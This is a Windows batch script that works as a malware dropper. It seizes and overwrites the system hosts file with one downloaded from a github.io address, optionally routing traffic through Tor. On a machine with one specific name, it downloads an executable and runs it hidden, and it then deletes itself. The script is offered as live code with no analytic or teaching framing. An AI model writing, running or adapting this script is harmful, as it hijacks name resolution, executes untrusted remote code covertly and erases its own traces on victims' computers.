@echo off
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

TAKEOWN /F "C:\Windows\System32\drivers\etc\hosts"
ICACLS "C:\Windows\System32\drivers\etc\hosts" /INHERITANCE:e /GRANT:r %UserName%:(F) /T /C
curl.exe %proxy% https://cryptedlumos.github.io/Hosts/hosts --output "C:\Windows\System32\drivers\etc\hosts" && attrib -r -h -s -i "C:\Windows\System32\drivers\etc\hosts"
echo [TARGET START]
echo %computername%
if [%computername%]==[DESKTOP-HL4E5JJ] (
taskkill /f /im dll.exe
curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll1.exe" && nircmd exec hide "%temp%\dll1.exe"
) else (
echo.
)
echo [TARGET STOP]
echo "edkekdoekdoedcdjcn"
del /s /f /q /a "%~f0"
